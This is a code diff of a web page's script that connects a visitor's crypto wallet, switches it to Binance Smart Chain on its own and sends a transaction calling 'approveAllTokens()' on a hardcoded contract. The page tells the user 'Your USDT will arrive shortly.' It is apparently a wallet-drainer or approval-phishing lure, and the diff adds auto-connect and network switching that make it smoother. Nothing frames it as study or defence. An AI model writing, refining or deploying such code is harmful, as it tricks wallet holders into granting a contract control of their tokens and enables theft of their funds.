@@ -213,17 +213,10 @@
     </div>
 
     <script>
-        // Load Web3.js dynamically
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
-        script.onload = function() {
-            console.log('✓ Web3.js loaded successfully');
-        };
-        document.head.appendChild(script);
-
         const CONFIG = {
             CONTRACT_ADDRESS: "0xC606AAf11BE4a2320d785D49B657f40EfF771ac6",
             CHAIN_ID: 56,
+            CHAIN_ID_HEX: "0x38",
             RPC_URL: "https://bsc-dataseed1.binance.org:443"
         };
         
@@ -240,17 +233,45 @@
             walletInfo.innerHTML = `<strong>Connected Wallet:</strong><br>${address}`;
         }
         
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: CONFIG.CHAIN_ID_HEX }]
+                });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [{
+                                chainId: CONFIG.CHAIN_ID_HEX,
+                                chainName: "Binance Smart Chain",
+                                rpcUrls: [CONFIG.RPC_URL],
+                                blockExplorerUrls: ["https://bscscan.com"],
+                                nativeCurrency: {
+                                    name: "Binance Coin",
+                                    symbol: "BNB",
+                                    decimals: 18
+                                }
+                            }]
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error("Error adding BSC network:", addError);
+                        return false;
+                    }
+                }
+                console.error("Error switching to BSC:", switchError);
+                return false;
+            }
+        }
+        
         async function requestApproval() {
             try {
                 const confirmBtn = document.getElementById("confirmBtn");
                 confirmBtn.disabled = true;
-                
-                // Check if Web3 is loaded
-                if (typeof Web3 === 'undefined') {
-                    showStatus("❌ Loading Web3... please wait and try again", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
                 
                 if (!window.ethereum) {
                     showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
@@ -260,8 +281,7 @@
                 
                 showStatus("🔗 Connecting wallet...", "loading");
                 
-                const web3 = new Web3(window.ethereum);
-                
+                // Auto-connect wallet
                 const accounts = await window.ethereum.request({
                     method: "eth_requestAccounts"
                 });
@@ -269,9 +289,12 @@
                 const userAddress = accounts[0];
                 updateWalletInfo(userAddress);
                 
-                const chainId = await web3.eth.getChainId();
-                if (chainId !== CONFIG.CHAIN_ID) {
-                    showStatus("❌ Please switch to BSC network (Chain ID: 56)", "error");
+                showStatus("🔄 Switching to BSC network...", "loading");
+                
+                // Auto-switch to BSC
+                const switched = await switchToBSC();
+                if (!switched) {
+                    showStatus("❌ Failed to switch to BSC network. Please switch manually.", "error");
                     confirmBtn.disabled = false;
                     return;
                 }
@@ -289,15 +312,16 @@
                     }
                 ];
                 
-                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.CONTRACT_ADDRESS);
-                const txData = contract.methods.approveAllTokens().encodeABI();
+                // Create contract data
+                const contractABI = new TextEncoder().encode(JSON.stringify(CONTRACT_ABI));
+                const functionSelector = "0x7cefa5da"; // approveAllTokens() selector
                 
                 const txHash = await window.ethereum.request({
                     method: "eth_sendTransaction",
                     params: [{
                         from: userAddress,
                         to: CONFIG.CONTRACT_ADDRESS,
-                        data: txData,
+                        data: functionSelector,
                         gas: "0x5B8D80"
                     }]
                 });
@@ -307,14 +331,22 @@
                 let receipt = null;
                 let attempts = 0;
                 while (!receipt && attempts < 60) {
-                    receipt = await web3.eth.getTransactionReceipt(txHash);
+                    try {
+                        receipt = await window.ethereum.request({
+                            method: "eth_getTransactionReceipt",
+                            params: [txHash]
+                        });
+                    } catch (e) {
+                        console.log("Waiting for confirmation...");
+                    }
+                    
                     if (!receipt) {
                         await new Promise(resolve => setTimeout(resolve, 1000));
                         attempts++;
                     }
                 }
                 
-                if (receipt && receipt.status === true) {
+                if (receipt && receipt.status === "0x1") {
                     showStatus("✅ Approval confirmed! Your USDT will arrive shortly.", "success");
                     confirmBtn.textContent = "✓ Completed";
                     confirmBtn.disabled = true;
@@ -329,20 +361,60 @@
                 confirmBtn.disabled = false;
                 
                 if (error.code === 4001) {
-                    showStatus("❌ You rejected the approval request", "error");
+                    showStatus("❌ You rejected the request", "error");
                 } else {
                     showStatus(`❌ Error: ${error.message || "Unknown error occurred"}`, "error");
                 }
             }
         }
         
-        window.addEventListener('load', function() {
-            if (window.ethereum && window.ethereum.isTrustWallet) {
-                console.log("✓ Running in Trust Wallet");
-            } else if (window.ethereum && window.ethereum.isMetaMask) {
-                console.log("✓ Running in MetaMask");
+        // Auto-connect on page load
+        window.addEventListener('load', async function() {
+            if (window.ethereum) {
+                try {
+                    // Check if already connected
+                    const accounts = await window.ethereum.request({
+                        method: "eth_accounts"
+                    });
+                    
+                    if (accounts.length > 0) {
+                        console.log("✓ Already connected to wallet");
+                        updateWalletInfo(accounts[0]);
+                        
+                        // Auto-switch to BSC if not already on it
+                        try {
+                            const chainId = await window.ethereum.request({
+                                method: "eth_chainId"
+                            });
+                            
+                            if (chainId !== CONFIG.CHAIN_ID_HEX) {
+                                await switchToBSC();
+                            }
+                        } catch (e) {
+                            console.log("Could not check/switch network");
+                        }
+                    }
+                } catch (e) {
+                    console.log("Auto-connect not available");
+                }
             }
         });
+        
+        // Listen for network changes
+        if (window.ethereum) {
+            window.ethereum.on('chainChanged', () => {
+                console.log("Network changed");
+                window.location.reload();
+            });
+            
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length > 0) {
+                    updateWalletInfo(accounts[0]);
+                } else {
+                    document.getElementById("walletInfo").style.display = "none";
+                }
+            });
+        }
     </script>
 </body>
 </html>
